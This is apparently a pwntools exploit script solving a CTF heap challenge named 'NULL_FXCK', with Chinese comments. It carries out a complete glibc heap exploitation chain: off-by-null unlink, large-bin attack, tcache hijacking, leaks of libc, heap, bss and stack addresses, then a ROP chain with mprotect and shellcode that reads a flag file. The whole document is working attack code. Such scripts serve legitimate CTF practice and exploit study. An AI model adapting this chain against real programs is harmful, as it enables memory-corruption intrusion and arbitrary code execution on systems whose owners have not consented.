#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import os
from pwn import *
#__Author__ = Cnitlrt
# context.log_level = 'debug'

binary = './NULL_FXCK'
elf = ELF(binary)
libc = elf.libc
context.binary = binary

DEBUG = 1
if DEBUG:
  p = process(binary)
else:
  host = "node2.hackingfor.fun"
  port =  30597 
  p = remote(host,port)
if DEBUG == 2:
  host = ""
  port = 0
  user = ""
  passwd = ""
  p = ssh(host,port,user,passwd)
l64 = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
sla = lambda a,b  :p.sendlineafter(str(a),str(b))
sa  = lambda a,b  :p.sendafter(str(a),str(b))
lg  = lambda name,data : p.success(name + ": 0x%x" % data)
se  = lambda payload: p.send(payload)
rl  = lambda      : p.recv()
sl  = lambda payload: p.sendline(payload)
ru  = lambda a     :p.recvuntil(str(a))
def cmd(idx):
    sla(">> ",str(idx))
def add(size,payload = ""):
    cmd(1)
    sla("Size: ",str(size))
    if payload:
        sa("tent: ",payload)
    else:
        sa("tent: ","aaa")
def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)
def free(idx):
    cmd(3)
    sla("dex: ",str(idx))
def show(idx):
    cmd(4)
    sla("dex: ",str(idx))
def edit(idx,payload):
    cmd(2)
    sla("dex: ",str(idx))
    sa("tent: ",payload)
def addWhere(addr,payload):
    free(4)
    add(0x520,"a"*0x20+p64(0)+p64(0x4a1)+p64(0)*9+p64(0x0001000000000000)+"\x00"*0x198+p64(addr)+'\x00'*0x100)
    add(0x300,payload)
def largebinAttack(addr):
    free(4)
    add(0x520,"a"*0x20+p64(0)+p64(0x4a1)+p64(0)*3+p64(addr-0x20))
    free(8)
    add(0x478)

add(0x148) #0   
add(0x4f8) #1
add(0x1f8) #2

add(0x4f8) #3
add(0x4f8) #4
add(0x4f8) #5
add(0x4f8) #6

add(0x4f8) #7
add(0x4f8) #8
add(0x4f8) #9
add(0x4f8) #10
# 申请较多对堆块备用

free(6)
free(4)
free(8)
free(3)
# 3 4合并，其中残留一个指针

add(0x528,"a"*0x4f0+p64(0)+p64(0xa00))#3
# 切割堆块 尾部为残留指针

add(0x4c0)#4
add(0x4f0)#6
add(0x4f0)#8
# 全部申请回来方便利用

free(4)
free(5)

add(0x4f0)#4
add(0x4c8)

free(8)
free(4)
free(6)
add(0x4f0,"a"*0x9)#4
add(0x4f0)#6
add(0x4f0)#8
free(6)
free(8)
free(7)

add(0x520,"a"*0x4f0+p64(0)+p64(0x501)+"a")#6
add(0x4c8)#8
add(0x4f0)#7
edit(5,"a"*0x4c0+p64(0xa00))

free(4)
# dbg()
# 前面为 unlink 操作 , pwndbg par 命令会识别错误，但没关系
add(0x520)
# 将前面一个堆块申请出去，让可控指针指向下个 chunk 的头

add(0x1000)
# 把 unsorted bin 卡进 large bin ，造成可 puts 的值

show(5)
libc_base = l64()-0x1e4160
lg("libc_base",libc_base)

add(0x1f8)
add(0x7c0)

free(5)
show(12)
# show 出 heap_base

key = u64(p.recv(5).ljust(8,"\x00"))
lg("key",key)
add(0x1f8)
# 这里又从 tcache 里拿回来了？？？
# 并不是，这个是重新申请的一个堆块

free_hook1 = libc.sym["__free_hook"]+libc_base&0xfffffffffffff000
free(4)

add(0x520,"a"*0x20+p64(0)+p64(0x4a1)+"a"*0x490+p64(0)+p64(0x21)*7)

free(13)

add(0x480,'aa')

poprdi = 0x000000000002858f+libc_base
leaver = 0x000000000005591c+libc_base
poprsi = 0x000000000002ac3f+libc_base
pop2r = 0x00000000001597d6+libc_base
poprax = 0x0000000000045580+libc_base
syscall = 0x00000000000611ea+libc_base
poprdx = 0x0000000000114161+libc_base
poprsp = 0x000000000003418a+libc_base
add(0x358+0x20-0x40,p64(0)+p64(pop2r)+p64(free_hook1)+p64(0)+p64(leaver)+p64(poprdi)+p64(0)+p64(poprax)+p64(0)+p64(poprdx)+p64(0x1000)+p64(syscall)+p64(poprsp)+p64(free_hook1))

free(8)
free(4)

add(0x520,"a"*0x20+p64(0)+p64(0x4a1)+p64(0)*3+p64(0x1eb538+libc_base-0x20))

# 此处为攻击 tcache 管理块基地址，把 tcache 劫持到可控区域

gdb.attach(p)

free(13)

#chunk 8
add(0x478,p64(0)*9+p64(0x0001000000000000)+"\x00"*0x198+p64(libc_base+libc.sym["__free_hook"])+'\x00'*0x100)

free(4)

add(0x520,"a"*0x20+p64(0)+p64(0x4a1)+p64(0)*9+p64(0x0001000000000000)+"\x00"*0x198+p64(libc_base+0x1e7600+0x20)+'\x00'*0x100)
#chunk 13
add(0x300,p8(0)) 

free(4)
add(0x520,"a"*0x20+p64(0)+p64(0x4a1)+p64(0)*3+p64(0x1e7600+0x20+libc_base-0x20))
free(8)
add(0x478)
# free(4)
# add(0x520,"a"*0x20+p64(0)+p64(0x4a1))
show(13)
heap_addr = u64(p.recv(6).ljust(8,"\x00"))
lg("heap_addr",heap_addr)
addr = libc_base+0x21c1e0
free(4)
add(0x520,"a"*0x20+p64(0)+p64(0x4a1)+p64(0)*9+p64(0x0001000000000000)+"\x00"*0x198+p64(heap_addr+0x10)+'\x00'*0x100)
add(0x300,p64(0)*2)
free(4)
add(0x520,"a"*0x20+p64(0)+p64(0x311)+p64(addr^key)+p64(0)*8+p64(0x0004000000000000)+"\x00"*0x198+p64(heap_addr+0x10)+'\x00'*0x100)
add(0x300,"a")
add(0x300,"a")
free(15)
show(16)
key2 = addr >> 12
bss_addr = u64(p.recv(6).ljust(8,"\x00")) ^key^key2
bss_addr = bss_addr+0x4020
lg("bss_addr",bss_addr)
free(4)
add(0x520,"a"*0x20+p64(0)+p64(0x311)+p64(0)*9+p64(0x0001000000000000)+"\x00"*0x198+p64(bss_addr+0x140)+'\x00'*0x100)

add(0x300,p64(libc_base+libc.sym["environ"]))
show(0)
stack_addr = l64()
lg("stack_addr",stack_addr)
free(4)
add(0x520,"a"*0x20+p64(0)+p64(0x4a1)+p64(0)*9+p64(0x0001000000000000)+"\x00"*0x198+p64(stack_addr-0x148)+'\x00'*0x100)

payload = p64(poprsi)*2+p64(free_hook1)+p64(poprdi)+p64(0)+p64(poprax)+p64(0)+p64(poprdx)+p64(0x1000)*2+p64(syscall)+p64(poprsp)+p64(free_hook1)

add(0x300,payload)
payload = [poprdi,free_hook1,poprsi,0x2000,poprdx,0x7,0x7,poprax,10,syscall,free_hook1+0x70]
sc = shellcraft.open("./flag",0)
sc += shellcraft.read("rax",free_hook1+0x300,0x100)
sc += shellcraft.write(1,free_hook1+0x300,0x100)
p.sendline(flat(payload).ljust(0x70,"\x90")+asm(sc))

# gdb.attach(p)
p.interactive()
